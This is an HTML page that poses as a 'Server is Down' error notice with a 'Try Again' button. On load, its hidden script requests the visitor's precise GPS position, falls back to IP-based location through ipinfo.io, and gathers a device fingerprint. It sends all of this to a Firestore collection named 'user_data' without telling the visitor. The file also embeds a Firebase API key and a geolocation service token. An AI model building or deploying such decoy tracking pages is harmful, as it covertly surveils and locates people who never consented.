<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home Page</title>
    <script type="module">
        // Import Firebase v9+ (Modular)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.appspot.com",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };
        
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                onlineStatus: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                pageURL: window.location.href
            };
        }

        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    callback({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        type: "GPS"
                    });
                }, error => {
                    console.warn("❌ GPS denied, using IP location instead.");
                    callback(null);
                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
            } else {
                console.warn("❌ GPS not supported.");
                callback(null);
            }
        }

        function getIPLocation(callback) {
            fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                .then(response => response.json())
                .then(data => {
                    const locationData = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        location: data.loc.split(","),
                        org: data.org,
                        postal: data.postal || "Unknown",
                        timezone: data.timezone || "Unknown",
                        type: "IP"
                    };
                    callback(locationData);
                })
                .catch(error => {
                    console.error("❌ Error fetching IP location:", error);
                    callback(null);
                });
        }

        function saveUserData(locationData) {
            const userData = {
                location: locationData || "Unknown",
                device: getDeviceInfo(),
                timestamp: new Date(),
                ip: locationData?.ip || "Unknown"
            };
            
            addDoc(collection(db, "user_data"), userData)
                .then(() => console.log("✅ User data saved:", userData))
                .catch(error => console.error("❌ Error saving user data:", error));
        }

        getGPSLocation(gpsData => {
            if (gpsData) {
                saveUserData(gpsData);
            } else {
                getIPLocation(ipData => saveUserData(ipData));
            }
        });
    </script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
            color: #333;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        h1 {
            font-size: 36px;
            margin-bottom: 10px;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        .icon {
            font-size: 80px;
            color: #dc3545;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="icon">⚠️</div>
        <h1>Server is Down</h1>
        <p>We are currently experiencing technical difficulties. Please try again later.</p>
        <button onclick="location.reload()">Try Again</button>
    </div>
</body>
</html>
